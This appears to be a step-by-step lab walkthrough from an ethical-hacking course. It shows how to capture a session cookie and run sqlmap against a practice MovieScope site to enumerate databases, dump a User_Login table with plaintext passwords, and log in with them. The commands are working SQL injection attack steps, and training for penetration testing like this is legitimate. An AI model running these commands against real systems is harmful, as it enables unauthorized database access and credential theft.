Step 1:  The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lowerleft corner of the browser, and press Enter

Step 2: Click the MATE Terminal icon at the top of the Desktop window to open a Parrot Terminal window.

Step 3: In the terminal window, type sudo su and press Enter to run the programs as a root user.

Step 4: In the [sudo] password for attacker field, type a password and press Enter.
 Note: The password that you type will not be visible.

Step 5: Now, type cd and press Enter to jump to the root directory

Step 6: In the Parrot Terminal window, type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=”[cookie value that you
 copied earlier]” --dbs and press Enter.
 Note: In this query, -u specifies the target URL (the one noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs
 enumerates DBMS databases.

Step 7: The above query causes sqlmap to apply various injection techniques on the name parameter of the URL in an attempt to extract the
 database information of the MovieScope website

Step 8: The databases present in the MSSQL server. It also displays information about the web server OS, web application
 technology, and the backend DBMS you can use to query afterward

Step 9: Type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=”[cookie value which you have copied in Step 8]” -D
 moviescope --tables and press Enter.
Note: In this query, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.
The above query causes sqlmap to scan the moviescope database for tables

Step 10: sqlmap retrieves and displays the table contents of the moviescope. Now, we will retrieve the content of the column User_Login.
 Type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=”[cookie value which you have copied in Step 8]” -D
 moviescope -T User_Login --dump and press Enter to dump all the User_Login table content.

Step 11: sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users’ usernames under the Uname
 column and passwords under the password column, as shown in screenshot below. Under the password column, the passwords are shown in plain text.

Step 12: To verify whether the login details are valid, attempt to log in with the extracted login details of any of the users. To do so, switch back to
 the web browser, close the Developer Tools console, and click Logout to start a new session on the site.
